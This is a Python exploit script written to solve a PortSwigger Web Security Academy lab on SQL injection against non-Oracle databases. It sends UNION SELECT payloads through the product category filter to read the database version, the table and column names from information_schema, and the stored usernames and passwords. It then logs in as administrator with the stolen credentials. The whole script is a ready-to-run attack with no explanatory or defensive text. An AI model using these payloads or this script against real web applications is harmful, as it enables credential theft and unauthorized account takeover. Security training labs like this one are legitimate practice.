# SQL injection attack, listing the database contents on non-Oracle databases

# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_payload(s, url, payload):
	injection_uri = url + payload
	r = s.get(injection_uri)
	time.sleep(1)
	print('[+] Using payload:\t%s\n' % payload)
	return r

def get_version(s, url):
	filter_path = url + '/filter?category='
	payload = "' UNION SELECT version(), NULL--"
	print('\n[+] Trying to retrieve the Version of the database...')
	r = send_payload(s, filter_path, payload)
	res = r.text
	if r.status_code == 200:
		version = re.search("<th>(.*)</", res).group(1)
		return version
	else:
		return False

def get_table_names(s, url):
	filter_path = url + '/filter?category='
	sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
	print('\n[+] Trying to retrieve the Users Table in the database...')

	r = send_payload(s, filter_path, sql_payload)
	res = r.text
	if r.status_code == 200:
		soup = BeautifulSoup(r.content, 'html.parser')

		table = soup.find(text=re.compile('.*users.*'))
		return table
	else:
		return False

def get_columns(s, url, table):
	filter_path = url + '/filter?category='
	sql_payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--" % table
	print('\n[+] Trying to retrieve the Columns of the %s table...' % table)

	r = send_payload(s, filter_path, sql_payload)
	res = r.text
	if r.status_code == 200:
		columns = re.findall("<th>(.*)</", res)
		return columns
	else:
		return False

def get_creds(s, url, table, columns):
	print('\n[+] Trying to retrieve the Users Credentials in the database...')
	filter_path = url + '/filter?category='
	if 'passw' in columns[0]:
		pass_col = columns[0]
	elif 'passw' in columns[1]:
		pass_col = columns[1]
	else:
		pass_col = columns[2]
	if 'user' in columns[0]:
		user_col = columns[0]
	elif 'user' in columns[1]:
		user_col = columns[1]
	else:
		user_col = columns[2]
	sql_payload = "' UNION SELECT %s, %s FROM %s--" % (user_col, pass_col, table)
	r = send_payload(s, filter_path, sql_payload)
	res = r.text
	if r.status_code == 200:
		creds = re.findall("""<th>(.*)</th>
                            <td>(.*)</td>""", res)
		result = []
		for cred in creds:
			formated_cred = "%s:%s" % (cred[0], cred[1])
			print('Found credentials:\t %s' % formated_cred)
			result.append(formated_cred)
		return result
	else:
		return False

def connect_as_admin(s, url, cred):
	print('\n[+] Trying to login as Administrator with found credentials...')
	login_path = url + '/login'
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	username = cred.split(':')[0]
	password = cred.split(':')[1]
	login_data = {"username": username, "password": password, "csrf": csrf_token}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	res = r.text
	if 'Your username is: administrator' in res:
		return r.text
	else:
		return False


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: SQL injection attack, listing the database contents on non-Oracle databases')
	parser = argparse.ArgumentParser(description="[+] Lab: SQL injection attack, listing the database contents on non-Oracle databases")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			version = get_version(s, url)
			time.sleep(1)
			if not version:
				print('\n[-] Exploit Failed to get the version <!>')
				sys.exit(-1)
			else:
				print('[+] Database version:\t%s' % version)
			table = get_table_names(s, url)
			time.sleep(1)
			if not table:
				print('\n[-] Exploit Failed to get the table names <!>')
				sys.exit(-1)
			else:
				print('[+] Found table:\t%s' % table)
			columns = get_columns(s, url, table)
			if not columns:
				print('\n[-] Exploit Failed to get the table names <!>')
				sys.exit(-1)
			else:
				print('[+] Found Columns:\t%s' % columns)
			creds = get_creds(s, url, table, columns)
			if not creds:
				print('\n[-] Exploit Failed to get the content of the database <!>')
				sys.exit(-1)
			else:
				for cred in creds:
					if 'admin' in cred:
						if not connect_as_admin(s, url, cred):
							print('\n[-] Exploit Failed to connect as Admin <!>')
						else:
							print('\n[+] The Exploit has sucessfully connected as Admin !')
							time.sleep(5)
							s.cookies.clear()
							s.headers.clear()
							r = s.get(url)
							if 'Congratulations, you solved the lab!' in r.text:
								print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
